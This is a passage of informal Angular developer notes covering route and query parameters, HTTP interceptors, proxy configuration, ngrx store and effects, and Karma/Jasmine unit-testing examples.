            "app.routing-module.ts" , {path : "targetComp/:varname_1/:varname_2", component: TargetComponent}
            
            "targetComponent.ts"    , constructor(private route: ActivatedRoute) {
                                         // a. Not Preferred , using "ActivatedRouteSnapshot"
                                         console.log(`${route.snapshot.queryParams['q1']}`);             // 'mapcolumns'
                                         console.log(`${route.snapshot.queryParamMap.get('q2')}`);       // 163
                                         console.log(`${route.snapshot.queryParamMap.getAll('q2')}`);    // [163, 592, 586]
                                         console.log(`${route.snapshot.queryParamMap.keys}`);            // ['q1', 'q2']
                                         
                                         // b. Preferred , using ActivatedRoute and SUBSCRIBE
                                         route.queryParams.subscribe((qparam: Params) => {
                                             console.log(`${qparam['q1']}`);                            // 'mapcolumns'
                                         });
                                         route.queryParamMap.subscribe((qparammap: ParamMap) => {
                                             console.log(`${qparammap.get('q2')}`);                     // 163
                                             console.log(`${qparammap.getAll('q2')}`);                  // [163, 592, 586]
                                             console.log(`${qparammap.keys}`);                          // ['q1', 'q2']
                                         });
                                      }
 4. Request body parameters
 ---------------------------
 Example : ".service.ts"           , private httpOptions = {
                                        headers: new HttpHeaders({
                                          'Content-Type':  'application/json'
                                        }),
                                        params: {                                 // appended as query string parameters in request URL
                                          "chkP" : "namo ji",
                                          "chkP1" : "PM"
                                        }
                                     };
                                     constructor(private _http: HttpClient) { }
                                     addProduct(HTTP_BODY) {
                                         return this._http.post(this._productsUrl, HTTP_BODY, this.httpOptions)
                                                          .pipe(catchError((err: Error) => { return throwError(err.message) })); }
 NOTE - To read HTTP RESPONSE BODY, use INTERCEPTORS.

5. Fragment
----------------------------
A fragment or a hash fragment appends data to URL with `#`, after query params.
Example : "component.html"        , <a routerLink="/targetComp/78990/kapoor" [fragment]="'checkFrag'"></a>
                                    OR
          "component.ts"          , this.router.navigate(['/targetComp'], {fragment: 'checkFrag'});
	  
	  "targetComponent.TS"    , constructor(private route: ActivatedRoute) {
	  				this.route.fragment.subscribe((frag: string) => {
                                             console.log(`${frag}`);
                                         });
	                            }


CONTEXT PATH
=================
Add a suffix to server hostname (IP/PORT) that is common and specific to our whole angular application.
One way can be to write this common suffix part before each route path in routing.module.ts and also with navigate() functions, if any.
A better approach is to use APP_BASE_HREF as follows:
- app.module.TS
  import {APP_BASE_HREF} from '@angular/common';

  // inside providers array
  providers: [{provide: APP_BASE_HREF, useValue: '/esp/kapoor/rakshit'}]



LOCATION STRATEGIES
=====================
REFERENCE   :   https://codecraft.tv/courses/angular/routing/routing-strategies/

we have two strategies we can use to implement client side routing,
one is called the HashLocationStrategy and the other is called the PathLocationStrategy.

The default in Angular is the PathLocationStrategy, if we do nothing that is the strategy Angular will employ.


HashLocationStrategy
---------------------
To enable HashLocationStrategy in an Angular application we pass {useHash: true} when we are providing our routes with RouterModule
eg:-  RouterModule.forRoot(routes, {useHash: true})

URL can contain some data prepended with a # character.

The # part of the url is called the hash fragment.

It’s normally used so that people can link to a particular section in a HTML page, specifically anchor tags,
for example if there is an anchor tag with an name attribute of routing-strategies like so:

<a name="routing-strategies"></a>

Then if you created a bookmark of   http://somedomain.com/page#routing-strategies
Then the browser would open somedomain.com/page and then scroll down so that the <a name="routing-strategies"></a> tag is at the top of the page.

Also anything past the # in a URL never gets sent to the server.
So if your URL was   https://codecraft.tv/contact/#/foo/moo/loo   then the browser makes a GET request to https://codecraft.tv/contact/ only.
The #/foo/moo/loo part of the URL is never sent.

It preserves a state of page and so on RELOADING a page , the UI state is maintained.



HTTP INTERCEPTORS
========================
- Interceptors allow to inspect & transform Http requests before it goes to the server ie act as gate between outgoing requests or incoming responses.
  Multiple interceptors can be chained, NOTE : The interceptors will be called in the order in which they were provided.
  It is useful for logging, authentication etc.
  If interceptor was not there, the code has to be duplicated in each HttpClient method call.
  
- Steps
  1) Create an Injectable class for each type of interceptor implementing interface HttpInterceptor
  2) In the interface method, intercept, handle the request appropriately and call next so that the next interceptor in the chain can handle until the last interceptor
     The intercept method takes two arguments, req and next, and returns an observable of type HttpEvent.
          req is the request object itself and is of type HttpRequest.
          next is the http handler, of type HttpHandler. The handler has a handle method that returns our desired HttpEvent observable.
     HttpRequest objects are immutable, The request object’s clone method is used to first make a copy, then modify the copy and call handle on the modified copy.
  3) The class implementing HttpInterceptor should be mentioned in 'providers' array in AppModule.ts.
     multi: true option tells Angular that HTTP_INTERCEPTORS is a token for a multiprovider that injects an array of values, rather than a single value.
  // example
  // 1. log-interceptor.ts
  @Injectable()
  export class LogRequestInterceptor implements HttpInterceptor {
    intercept(req: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {
       console.log(`**** LogRequestInterceptor => url = ${req.url}, method = ${req.method}`);
       req.headers.keys().map((key) => {console.log(`${key}=${req.headers.get(key)}`)});
       return next.handle(req);
     }
   }
   
   // 2A. auth-interceptor.ts
   //     Intercepting HTTP Request
   @Injectable()
   export class AuthInterceptor implements HttpInterceptor {
     intercept(req: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {
     
       console.log(`**** REQUEST URL **** ==> ${req.url}`);
       console.log(`**** REQUEST PARAMETERS URL **** ==> ${req.urlWithParams}`);       // URL with all query string parameters (including those passed in HTTP options)
       console.log(`**** REQUEST BODY **** ==> ${JSON.stringify(req.body)}`);
       console.log(`**** REQUEST HEADERS **** ==> ${req.headers.keys()}`);
       console.log(`**** REQUEST PARAMS **** ==> ${req.params.keys()}`);              // query string parameters passed in HTTP options only
       
       if(req.body && req.headers && req.params){
          duplicate = req.clone({
            headers: req.headers.set('Authorization', "mytoken"),                    // .set()    - overwrites(if existing) or add new(if not existing) header
	                                                                             // .append() - adds multiple values(if existing) or add new(if not existing) header
            params: req.params.set('filter', 'completed'),
            body: req.body.replace(/pizza/gi, 'desi_bread')
          });
          return next.handle(duplicate);
       }
       return next.handle(req);
     }
    }
    
   // 2B. auth-interceptor.ts
   //     Intercepting HTTP Response
   @Injectable()
   export class AuthInterceptor implements HttpInterceptor {
     intercept(req: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {

       console.log(`**** REQUEST URL **** ==> ${req.url}`);
       console.log(`**** REQUEST PARAMETERS URL **** ==> ${req.urlWithParams}`);       // URL with all query string parameters (including those passed in HTTP options)
       console.log(`**** REQUEST BODY **** ==> ${JSON.stringify(req.body)}`);
       console.log(`**** REQUEST HEADERS **** ==> ${req.headers.keys()}`);
       console.log(`**** REQUEST PARAMS **** ==> ${req.params.keys()}`);              // query string parameters passed in HTTP options only

       // specify url for whose RESPONSE headers required
       if(req.url.toLowerCase().includes("filedata")) {
        return next.handle(req).pipe(
            // There may be other events besides the response
            filter(event => event instanceof HttpResponse),
            tap((event: HttpResponse<any>) => {
                console.log(`RESPONSE URL ==> ${event.url}`);                        // same as HTTPRequest.urlWithParams
                console.log(`RESPONSE BODY ==> ${JSON.stringify(event.body)}`);
                console.log(`RESPONSE HEADERS ==> ${event.headers.keys()}`);
            })
        );
       } else {
           return next.handle(req);
       }
     }
    }
    
    // 3. httpInterceptorsProvider.ts
    import { HTTP_INTERCEPTORS } from '@angular/common/http';
    import { LogRequestInterceptor } from './log-request-interceptor';
    import { AuthInterceptor } from './auth-interceptor';
    export const httpInterceptorProviders = [
      { provide: HTTP_INTERCEPTORS, useClass: AuthInterceptor, multi: true },                // order matters of providing interceptors
      { provide: HTTP_INTERCEPTORS, useClass: LogRequestInterceptor, multi: true }
    ];
    
    // 4. app.module.ts
   providers : [httpInterceptorProviders]
   
   
PROXYING TO A BACKEND SERVER
================================
- Providing relative (`/products`) URL instead of absolute URL (`http://localhost:3000/products`) in service file.
  eg:- divert all calls for `http://localhost:4200/products` to a server running on `http://localhost:3000/products`
- Create a file 'proxy.conf.json' in your project's src/ folder
  NOTE : if you edit the 'proxy configuration file', you must relaunch the `ng serve` process to make your changes effective.
  {
    "/products": {
      "target": "http://localhost:3000",
      "secure": false
    }
  }
- In 'angular.json', add the "proxyConfig" option to the "serve" target
  "architect": {
    "serve": {
      "builder": "@angular-devkit/build-angular:dev-server",
      "options": {
        "browserTarget": "your-application-name:build",
        "proxyConfig": "src/proxy.conf.json"
      },



Redux
============
A state management library.
REFER : env_setup_REDUX.txt  --->  R (react) repo of kapoor-rakshit.


ngrx   (angular + Redux + RxJs)
=================================
                           -----> ACTION
                           |        |                         <----> REDUCER 1
                           |      STORE <------> ROOT REDUCER <----> REDUCER 2
                           |        |                         <----> REDUCER 3
                           |     SELECTOR
                           |        |
                           <----- VIEW
                           
It uses an additional SELECTOR block in it's architetcure as compared to REDUX. It is somehow similar to `store.subscribe()` in REDUX.
Here STORE sends all data to SELECTOR which then act as a pipe/filter for sending data to respective components ie Angular way.
STEPS
--------
- For debugging purpose, install chrome extension - 'Redux Dev Tools' , used from tab that appears in developer mode.
- Install ngrx store
> npm install --save @ngrx/store
> npm install --save @ngrx/store-devtools        // 'Redux Dev Tools' web extension work in sync from code using this library

- IMPORTANT NOTE : Create new module other than root module 'app.module.TS'    i.e.    `ng generate module <FEATURE_MODULE>`
                   To have different STATE for each module , say eg: PRODUCTS_MODULE, ORDERS_MODULE, CUSTOMERS_MODULE, EMPLOYEES_MODULE
                   LAZY LOADING with NGRX can also be achieved , it requires a different approach than this. REFER : official documentation :)

- In 'app.module.TS' , CREATE and INITIALIZE STORE
  import { StoreModule } from '@ngrx/store';
  import { StoreDevtoolsModule } from '@ngrx/store-devtools';   // plus declare these in imports[] array 
         imports: [ StoreModule.forRoot({}),                    // create STORE, forRoot({}) required in root module ie 'app.module.ts'
                    StoreDevtoolsModule.instrument({
                       name: '<APPNAME_FOR_DEV_DEBUGGING_BROWSER>',
                       maxAge: <MAX_NUMBER_OF_STATES_RECORDED_DEV_TOOL_FOR_UNDOING_REDOING>
                     })
                  ]
                  
- In '<FEATURE_MODULE>.module.TS' , CREATE and INITIALIZE STORE
  import { StoreModule } from '@ngrx/store';                     
  import { <NAME_OF_REDUCER> } from '<path>'                     // plus declare these in imports[] array
         imports: [
                    StoreModule.forFeature('<NAME_OF_STATE_VAR>', <NAME_OF_REDUCER_VAR>)
                  ]
                  
- Create a DIR named as state (a good convention) which will have following REDUCER and ACTION files:
  // 1. <FEATURE>.reducer.ts
  import { createFeatureSelector, createSelector } from '@ngrx/store';
  export interface <FEATURE_STATE_INTERFACE> {
                                                 INTERFACEdata1: string;
                                                 INTERFACEdata2: <INTERFACE>[];
                                             }
  const <initialStateVAR>: <FEATURE_STATE_INTERFACE> = { 
                                                          INTERFACEdata1: '', 
                                                          INTERFACEdata2: [{id:1, name: ''}, {id:2, name: ''}] 
                                                       };
                                                       
  const <getFeatureState> = createFeatureSelector< <FEATURE_STATE_INTERFACE> >('<NAME_OF_STATE_VAR>');   // entire STATE , <NAME_OF_STATE_VAR> same as defined in 'module.ts'
  export const <TOGGLE_SELECTOR> = createSelector(
      <getFeatureState>,                                             // create a sub selector from entire STATE
      state => state.INTERFACEdata1
  );
  export const <GET_EMPLOYEES_SELECTOR> = createSelector(            // create a sub selector from entire STATE
      <getFeatureState>,
      state => state.INTERFACEdata2
  );
  
  export const <NAME_OF_REDUCER_VAR> = (stateDATA:<FEATURE_STATE_INTERFACE>=<initialStateVAR>, actionDATA: <NAME_OF_ACTIONS_VAR>): <FEATURE_STATE_INTERFACE> => {
   switch (actionDATA.type) {
    case <ENUM_FROM_ACTIONS>.<KEY>:            // TOGGLE ACTION
      return {
        ...stateDATA,                           // IMPORTANT NOTE : (...) spread operator for {} will create a copy of it
        INTERFACEdata1: actionDATA.<payload>    // after a copy , the key(s) (<INTERFACEdata1>) written will be overwritten with new data (<actionDATA.<key>) specified
    };
    case <ENUM_FROM_ACTIONS>.<KEY>:            // ADD ACTION
      return {
        ...stateDATA,
        INTERFACEdata2: [
          ...stateDATA.INTERFACEdata2,         // However (...) spread operator for [] , spreads array values
          actionDATA.<payload>,
        ]
     };
     case <ENUM_FROM_ACTIONS>.<KEY>:           // DELETE ACTION
       return {
         ...stateDATA,
         INTERFACEdata2: stateDATA.INTERFACEdata2.filter((tpVAR) => tpVAR.<key> !== actionDATA.<payload>)
     };
     default:
       return stateDATA;
    }
  }
  
  // 2. <FEATURE>.action.ts
  import { Action } from '@ngrx/store';
  export enum <ENUM_FROM_ACTIONS> {
    <KEY> = '<VALUE_TOGGLE>',
    <KEY> = '<VALUE_ADD>',
    <KEY> = '<VALUE_DELETE>'
  }
  export class <TOGGLE_FUNC> implements Action {              // implement ACTION
    readonly type = <ENUM_FROM_ACTIONS>.<KEY>;                // readonly type of ACTION
    constructor(public <payload>: boolean) { 
        console.log("ACTION => ShowCompanyName");
    }
  }
  export class <ADD_FUNC> implements Action {
    readonly type = <ENUM_FROM_ACTIONS>.<KEY>;
    constructor(public <payload>: Employee) { 
        console.log("ACTION => Add");
    }
  }
  export class <DELETE_FUNC> implements Action {
    readonly type = <ENUM_FROM_ACTIONS>.<KEY>;
    constructor(public <payload>: string) { 
        console.log("ACTION => Delete");
    }
  }
  export type <NAME_OF_ACTIONS_VAR> = <TOGGLE_FUNC> | <ADD_FUNC> | <DELETE_FUNC>;        // export action types to be used for dispatch
  
- In 'ADD-component.ts' , DISPATCH ACTION
  import { Store } from '@ngrx/store';
  import * as <featureMethods> from '<FEATURE>.reducer.ts';
  import * as <featureActions> from '<FEATURE>.action.ts';
  constructor(private store: Store< <featureMethods>.<FEATURE_STATE_INTERFACE> >) { }
  onSubmit(formValue: any){
    let newEmployee = {
      id: 2
      name: formValue.name,
      location: formValue.location,
    };
    this.store.dispatch(new <featureActions>.<ADD_FUNC>(newEmployee));
  }
  
- In 'DISPLAY-component.ts' , SUBSCRIBE TO ACTION in ngOnInit() from corresponding MODULE only using SELECTOR
  import { Store, select } from '@ngrx/store';
  import * as <featureMethods> from '<FEATURE>.reducer.ts';
  constructor(private store: Store< <featureMethods>.<FEATURE_STATE_INTERFACE> >) { }
  ngOnInit() {
    this.store.pipe(select(<featureMethods>.<TOGGLE_SELECTOR>)).subscribe(
      (toggleVAR: boolean) => { this.VAR = toggleVAR; },
      (err: any) => { console.log(`${err}`); }
    );
    this.store.pipe(select(<featureMethods>.<GET_EMPLOYEES_SELECTOR>)).subscribe(
      (ARRVAR: Employee[]) => { this.VARARR = ARRVAR; },
      (err: any) => { console.log(`${err}`); }
    );
  }
  


ngrx-effects
=================================
This is used with ngRx for connecting to asynchronous backend services ie http GET, POST, PUT, DELETE, PATCH  ... etc

                              -----> ACTION <-----> EFFECTS <----> SERVICE <----> SERVER
                              |        |
                              |      STORE  <-----> ROOT REDUCER <----> REDUCER 1
                              |        |                         <----> REDUCER 2
                              |     SELECTOR
                              |         |
                              <----- VIEW
              
IMPORTANT NOTE : ALL ACTIONS WILL GO TO ALL EFFECTS and ALL REDUCERS also.
                 Effects accept action , perform activity (contact service/server to get data) , dispatch a new action (SUCCESS/ERROR)
STEPS
-----------
- INSTALL ngrx-effects
> npm install --save @ngrx/effects

- In 'DISPLAY-component.ts' , DISPATCH ACTION to EFFECTS in ngOnInit() , although this will go to all REDUCERS as well
  import { Store, select } from '@ngrx/store';
  import * as <featureMethods> from '<FEATURE>.reducer';
  import * as <featureActions> from '<FEATURE>.action';
  import { Observable } from 'rxjs';
  import { takeWhile } from 'rxjs/operators';
                          // any subscribe must be unsubsribed (manually or automatic) on component's destroy , to prevent memory leaks
                          // Angular automatically subscribes and unsubscribes if `async` pipe used in 'DISPLAY-component.html'
                          // avoiding .subscribe() to be written in .ts , `$` is a convention to make it an Observable variable 
  errMsgVAR$: Observable<string>;
  displayCompanyNameVAR$: Observable<boolean>;
  employeesVAR$: Observable<Employee[]>;
  constructor(private store: Store< <featureMethods>.<FEATURE_STATE_INTERFACE> >) { }
  ngOnInit() {
     this.errMsgVAR$ = this.store.pipe(select(<featureMethods>.<METHOD>));
     this.store.dispatch(new <featureActions>.<ACTION>());                              // NOTE : ACTION() to get data from service
     this.displayCompanyNameVAR$ = this.store.pipe(select(<featureMethods>.<METHOD>));
     this.employeesVAR$ = this.store.pipe(select(<featureMethods>.<METHOD>));
  }
  
- In 'DISPLAY-component.html'
  // 1
  <tr *ngFor='let employee of employees$ | async'></tr>                     // `async` pipe will extract value from Observable variable
  <div *ngIf="displayCompanyName$ | async"></div>
  // 2
  <div *ngIf="errMsg$ | async as errorMessageVAR" class="alert alert-danger">     // use of `as` with `async`, check not null, extract in VAR
    Error: {{ errorMessageVAR }}
  </div>
  
IMPORTANT NOTE : ACTIONS are declared in <FEATURE>.actions.ts
                 ANY ACTION will go to all EFFECTS and all REDUCERS also.
                 ACTIONS like ADD , LOAD , DELETE  etc... will be defined in <FEATURE>.effects.ts
                 ACTIONS like ADD_SUCCESS|ADD_ERROR , LOAD_SUCCESS|LOAD_ERROR , DELETE_SUCCESS|DELETE_ERROR etc... will be defined in <FEATURE>.reducer.ts
                 
- In '<FEATURE>.effects.ts'
  import { Actions, Effect, ofType } from '@ngrx/effects';
  import { mergeMap, map, catchError, tap } from 'rxjs/operators';
  import { of } from 'rxjs';
  import * as <featureActions> from '<FEATURE>.action';
  @Injectable()                                                                                // use of @Injectable()
  export class <FEATURE_EFFECTS> {
    constructor(private actions$: Actions, private employesService: <NAME_OF_SERVICE>) { }     // use actions$: Actions
    @Effect()                                                                                  // use of @Effect()
    loadEmployees$ = this.actions$.pipe(
        ofType(<featureActions>.<ENUM_FROM_ACTIONS>.<KEY>),                                // ofType pipe - similar to switch/case
        tap(val => console.log(`*** LOAD EFFECT ***`)),                                    // tap()  pipe - to log value from prev pipe
        mergeMap((action: <featureActions>.<ACTION>) => this.employesService.getEmployees().pipe(    // mergeMap - used for merging multiple action requests
            map((employees: Employee[]) => (new <featureActions>.<ACTION_SUCCESS>(employees))),      // dispatch new action
            catchError(err => of(new <featureActions>.<ACTION_ERROR>(err)))                          // of() - converts to observable sequence
        ))
    )
    @Effect()
    addEmployees$ = this.actions$.pipe(
        ofType(<featureActions>.<ENUM_FROM_ACTIONS>.<KEY>),
        tap(val => console.log(`*** ADD EFFECT ***`)),
        map((action: <featureActions>.<ACTION>) => { return action.payload }),
        mergeMap((employee:Employee) => this.employesService.addEmployee(employee).pipe(
            map((employee: Employee) => (new <featureActions>.<ACTION_SUCCESS>(employee))),
            catchError(err => of(new <featureActions>.<ACTION_ERROR>(err)))
        ))
    )
    @Effect()
    deleteEmployees$ = this.actions$.pipe(
        ofType(<featureActions>.<ENUM_FROM_ACTIONS>.<KEY>),
        tap(val => console.log(`*** DELETE EFFECT ***`)),
        map((action: <featureActions>.<ACTION>) => { return action.payload }),
        mergeMap((id:string) => this.employesService.deleteEmployee(id).pipe(
            map(() => (new <featureActions>.<ACTION_SUCCESS>(id))),
            catchError(err => of(new <featureActions>.<ACTION_ERROR>(err)))
        ))
    )
  }
  
- In '<FEATURE>.module.ts'
  import { StoreModule } from '@ngrx/store';
  import { EffectsModule } from '@ngrx/effects';
  import { <FEATURE_EFFECTS> } from '<FEATURE>.effects';
  import { <FEATURE_REDUCER> } from '<FEATURE>.reducer';
  @NgModule({
     imports: [
                 StoreModule.forFeature('<NAME_OF_STATE_VAR>', <FEATURE_REDUCER>),
                 EffectsModule.forFeature([FEATURE_EFFECTS])
              ]
  })
  
- In 'app.module.ts'
  import { StoreModule } from '@ngrx/store';
  import { StoreDevtoolsModule } from '@ngrx/store-devtools';
  import { EffectsModule } from '@ngrx/effects';
  @NgModule({
      imports: [
                  StoreModule.forRoot({}),
                  StoreDevtoolsModule.instrument({
                      name: 'Employees App Devtools',
                      maxAge: 20
                  }),
                  EffectsModule.forRoot([])
               ]
  })


TESTING (TDD / BDD)
========================
TDD (TEST DRIVEN DEVELOPMENT)
 - Test cases are to be written first , then code underlying those test cases.
 - TDD focuses on HOW the functionality is implemented / tested.
 - Test cases are written in a programming language.
 - Collaboration is required only between the developers.
 - Might be a better approach for projects which involve API and third-party tools.
 - Tools which support TDD are JUnit, TestNG, NUnit, Karma/Jasmine etc.
 
BDD (BEHAVIOR DRIVEN DEVELOPMENT)
 - BDD is an extension to TDD where instead of writing the test cases, we start by writing a behavior (scenario).
   Later, we develop the code which is required for our application to perform the behavior of evolving app.
 - BDD focuses on the behavior of an application for the end user / WHAT to test.
 - Scenarios are more readable when compared to TDD as they are written in simple English format.
 - Collaboration is required between all the stakeholders.
 - Might be a better approach for projects which are driven by user actions. For eg: e-commerce website, application system, etc.
 - Tools which support BDD are SpecFlow, Cucumber, MSpec, Selenium etc.
 - BDD tools use GHERKIN language to write files that contain FEATURES --> SCENARIOS --> STEPS (pre-condition | action | post-condition)
   eg: Feature: "register new user"
       Scenario: "sign-up form"
        Given:
        When:
        Then:
       Scenario: "credit card info"
        Given:
        When:
        Then:
 - Selenium comes with variants of:
                          REFER : https://www.selenium.dev/
   - SELENIUM IDE       : has a GUI | browser support : FIREFOX, CHROME | language support : JS
   - SELENIUM RC        : (REMOTE CONTROL) requires RC server between AUT and Tool | browser support : any | language support : any
   - SELENIUM WebDriver : no RC server required | browser support : any | language support : any
   - SELENIUM GRID      : used for parallel testing (testing app on multiple browsers simultaneouly)
   
   
Angular TDD
================
- Jasmine (Test Framework) , similar to javac which converts .java to .class
- Karma   (Test Runner)    , similar to java  which runs .class files

- comp.spec.ts file (SPECIFICATION file) is used for writing TEST SUITE which contains TEST CASES.
- test cases can involve:
  - COMPONENT CLASS testing    (variable/function of component)
  - COMPONENT DOM testing      (html of component)
  - COMPONENT SERVICE testing  (services used in component)
- To run angular tests
  > ng test --code-coverage            (MULTI-REPO)    // test: runs all .spec.ts in app | --code-coverage: generates report ( ROOT_DIR/coverage/index.html )
  > ng test <appName> --code-coverage  (MONO-REPO)
- commonly used methods:
  - TestBed()              : similar to app.module which will import the component
  - describe()             : define a test suite
  - it()                   : define a test case
  - expect()               : call to variable/function/queryselector to be tested
  - toBeTruthy()           : check for exist/present
  - toBeFalsy()            : check for not exist/present
  - toContain()            : check for contains substring
  - toEqual(arg1, arg2)    : check for equals exact match
  - toBe(arg1, arg2)       : arg1 is expected result, arg2 is a description of test if pass
  - beforeAll()            : called once at start of TEST SUITE (`describe`)
  - beforeEach()           : called before every TEST CASE (`it`)
  - afterEach()            : called after every TEST CASE (`it`)
  - afterAll()             : called once at end of TEST SUITE (`describe`)
  - xit()                  : prevents test case (`it`) from running , prepended with `x`
- In .component.spec.ts
  import { TestBed, async } from '@angular/core/testing';
  import { HttpClientTestingModule, HttpTestingController } from '@angular/common/http/testing';
  class MockEmployeesService { }                                           // name of methods must be same as in actual service class
  
  describe('FundingComponent', () => {
     let component: FundingComponent;
     let fixture: ComponentFixture<FundingComponent>;
     
     beforeEach(async(() => {
      TestBed.configureTestingModule({
      imports: [
        RouterModule.forRoot([]),
        ReactiveFormsModule
      ],
      declarations: [
        FundingComponent,
        MockFeedbackComponent
      ],
      providers: [
      {
        provide: InvestpathService,
        useClass: MockInvestpathService,
      },
      {
        provide: ConfirmationService,
        useClass: MockConfirmationService
      }]
    })
    .compileComponents();
    }));
  
    beforeEach(() => {
      fixture = TestBed.createComponent(FundingComponent);
      component = fixture.componentInstance;
    
      fixture.detectChanges();
    });
  
    it('should create', () => {
      expect(component).toBeTruthy();
    });
  });
  
// Component DOM testing
// TEST SUITE inside another test suite
      describe('Component DOM', () => {                                    
        let component: EmployeesComponent;
        let fixture: ComponentFixture<EmployeesComponent>;
        let employeesService: EmployeesService;

        beforeEach(async(() => {
          TestBed.configureTestingModule({
            imports: [ FormsModule, RouterTestingModule ],
            declarations: [ EmployeesComponent ],
            providers: [ { provide: EmployeesService, useClass: MockEmployeesService } ]
          }).compileComponents();
          employeesService = TestBed.inject(EmployeesService);
        }));

        beforeEach(() => {
          fixture = TestBed.createComponent(EmployeesComponent);
          component = fixture.componentInstance;
          fixture.detectChanges();
          const deElem: DebugElement = fixture.debugElement;
        });

        it(`check for contents of h1 tag`, () => {
          const debugElem = deElem.query(By.css('h1'));                           // .query() : returns DebugElement , first occurrence of selector
          const htmlElem: HTMLElement = debugElem.nativeElement;                  // .nativeElement : property of DebugElement
          expect(htmlElem.textContent).toEqual('Angular TDD Demonstration');
        });

        it(`should render a table heading Location`, () => {
          const debugElem = deElem.queryAll(By.css('th'))[0];                        // .queryAll() : returns DebugElement[] , all occurrence of selector
          const htmlElem: HTMLElement = debugElem.nativeElement;
          expect(htmlElem.textContent).toEqual('Location');
        });

        it(`should render 2 rows of data`, () => {
          const debugElem = deElem.query(By.css('tbody')).queryAll(By.css('tr'));    // .query() plus .queryAll()
          expect(debugElem.length).toEqual(2);
        });

        it(`should render first name as Emp1`, () => {
          const debugElem = deElem.query(By.css('tbody')).queryAll(By.css('tr'))[0].nativeElement.queryAll(By.css('td'))[0].nativeElement;
          expect(debugElem.textContent).toEqual('Emp1');
        })
      });
// Component SERVICE testing
// TEST SUITE inside another test suite
      describe('EmployeesService', () => {
        let httpClient: HttpClient;
        let httpTestingController: HttpTestingController;
        let empService: EmployeesService;

        beforeEach(() => {
          TestBed.configureTestingModule({
            imports: [ HttpClientTestingModule ],
            providers: [EmployeesService]
          });
          httpClient = TestBed.get(HttpClient);
          httpTestingController = TestBed.get(HttpTestingController);
          empService = TestBed.get(EmployeesService);
        });

        afterEach(() => {
          // After every test, assert that there are no more pending requests.
          httpTestingController.verify();
        })
        
        describe('getEmployees', () => {                                                     // TEST SUITE for GET req
          let expectedEmployees: Employee[];

          beforeEach(() => {
            expectedEmployees = [
              { id: 1, name: 'Emp-1', location: 'Loc-1' },
              { id: 2, name: 'Emp-2', location: 'Loc-2' }
            ] as Employee[];
          });

          it('should return expected employees (called once)', () => {
            empService.getEmployees().subscribe(
              (employees) => { expect(employees).toEqual(expectedEmployees, 'should return expected employees') }, fail);

            // EmployeesService should have made one request to GET employees from expected URL
            // .expectOne() : Expect that a single request has been made which matches the given URL, and return its mock.
            const req = httpTestingController.expectOne(empService.employeesUrl);
            expect(req.request.method).toEqual('GET');

            // Respond with the mock employees
            req.flush(expectedEmployees);
          });
        });

        describe('addEmployee', () => {                                                      // TEST SUITE for POST
          let expectedAddEmployee: Employee;
          expectedAddEmployee = { id: 1, name: 'Emp-1', location: 'Loc-1' };

          it('should add an employee and return with id inserted ', () => {
            const employeeToAdd: Employee = { name: 'Emp-1', location: 'Loc-1' };
            empService.addEmployee(employeeToAdd).subscribe(
              data => expect(data).toEqual(expectedAddEmployee, 'should return the employee with id inserted'), fail);

            // EmployeesService should have made one request to POST employee
            // .expectOne() : Expect that a single request has been made which matches the given URL, and return its mock.
            const req = httpTestingController.expectOne(empService.employeesUrl);
            expect(req.request.method).toEqual('POST');
            expect(req.request.body).toEqual(employeeToAdd);

            // Expect server to return the employee after POST
            const expectedResponse = new HttpResponse({ status: 200, statusText: 'OK', body: employeeToAdd });
            req.event(expectedResponse);
          });
        });
      });
    });
    
MISC. TESTING SAMPLE CODES/NOTES
---------------------------------------
    - test.TS       : require.context(/COMPONENT-NAME.component\.spec\.ts$/)      // To have a report of only a specific component
    - karma.conf.js : singleRun:false                                             // To rerun test report on any change of file(s)
    		    : captureTimeout:150000					  // To set timeout for browser while running test cases on machine
    
    - {provide: Store, useValue: {select: () => of({}) , dispatch: () => {}}}     // When working with Store test cases,add to providers array of TestBed config
    
    - const store = TestBed.get(Store);                                           
      spyOn(store,'select').and.returnValue(of()).and.returnValue(of());          // returnValue : return value from method | of : return value to observable success function
      spyOn(store,'select').and.returnValue(throwError(''));                                                                | throwError : return value to obsv error function
      
    - component['getProfileMetaData'](123);                                       // component's PRIVATE method call
      component['primaryAdvisor'] = <any>{advisorId : 1224};                      // component's PRIVATE property assignment
      
    - const appService = TestBed.get(AppSessionService);
      const investpathService = TestBed.get(InvestpathService);
      spyOn(appService, 'getItemFromStorage').and.returnValue(null);              // spyOn : calling service methods OR while writing expect() for them
      investpathService.investpathProfileInfo = {clientInfo: {client: false}};    // service's property assignment
      
    - spyOn<any>(component, 'saveDetails');                                       // spyOn : writing expect() for component's private method
      expect(component['saveDetails']).toHaveBeenCalled();
      
    - const elm = document.createElement('div') as HTMLElement;                   // HTML DOM related test cases
      elm.setAttribute('class', 'form-control__error-label');
      spyOn(document, 'querySelector').and.returnValue(elm);
      component['scrollToError']();
      expect(elm).toHaveClass('investpath-error');
      
    - const mockDialog = { open: jasmine.createSpy('open') };                     // mockDialog created 
      { provide: MatDialog, useValue: mockDialog }                                // add to providers array
      expect(mockDialog.open).toHaveBeenCalled();                                 // expect() for material dialog's open/close
      
    - const MAT_DIALOG_DATA_INITIAL = {                                           // mock data for dialog component having @Inject(MAT_DIALOG_DATA)
           title: '',
           handleAdditionalFunctionality: jasmine.any(Function)
      };
      { provide: MAT_DIALOG_DATA, useValue: MAT_DIALOG_DATA_INITIAL }             // add to providers array
      const data = TestBed.get(MAT_DIALOG_DATA);                                  // reference to MAT_DIALOG_DATA for writing expect()

